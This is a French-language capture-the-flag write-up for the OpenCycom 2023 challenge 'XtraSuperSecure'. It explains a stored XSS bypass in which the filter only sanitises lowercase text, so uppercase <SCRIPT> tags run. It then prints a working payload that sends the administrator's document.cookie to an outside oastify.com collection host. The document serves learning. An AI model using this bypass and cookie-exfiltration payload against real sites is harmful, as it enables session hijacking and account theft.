---
title: "XtraSuperSecure"
date: 2023-06-13T09:03:20-08:00
draft: false
---

# OpenCycom 2023 - XtraSuperSecure - *200 pts*

## Énoncé
Donnez votre avis sur l'évènement (et essayez de voler les cookies de l'administrateur) !

## Solution

Bon, je dois voler les cookies de l'admin, donc on est surement face à des attaques côté client (XSS ou CSRF). Le titre du chall nous donne également un indice sur la vulnérabilité à exploiter (XtraSuperSecure => XSS).

Ici, lorsque je laisse un message, il apparait dans une liste en bas de la page, qui se réinitialise quand l'admin passe regarder les avis.

![](/images/016/01.png)

Je peux essayer d'insérer un payload XSS basique, avec une balise `script`.

![](/images/016/02.png)

Mais on dirait qu'une protection est en place pour empêcher les attaques XSS.

![](/images/016/03.png)

Pas de panique, on peut essayer de contourner la protection en utilisant diverses techniques, et après quelques essais, on trouve que la sanitisation ne s'effectue que sur les caractères minuscules.

Du coup un payload comme `<SCRIPT>alert(1)</SCRIPT>` fonctionne !

![](/images/016/04.png)

![](/images/016/05.png)

On remarque que la balise script est correctement écrite et interprétée correctement par le navigateur.

![](/images/016/06.png)

À partir de là, nous pouvons crafter un payload qui va exfiltrer les cookies de l'administrateur vers une page web que nous contrôlons. Pour ce faire, on peut utiliser des services comme `Beeceptor` ou `RequestBin`.

Ici, mon script ajoute une simple balise `img`, qui va charger une image sur mon site malveillant, avec le cookie de l'administrateur.

```<SCRIPT>document.body.innerHTML = `<IMG src='http://oxpw0avtydduwu22k93fc71el5rwfn5bu.oastify.com/${document.cookie}'></IMG>`</SCRIPT>```

![](/images/016/07.png)

On attend un peu, et le flag apparait !

![](/images/016/08.png)

*FLAG : OPC{b0y\*\*\*\*\*\*\*\*\*\*}*
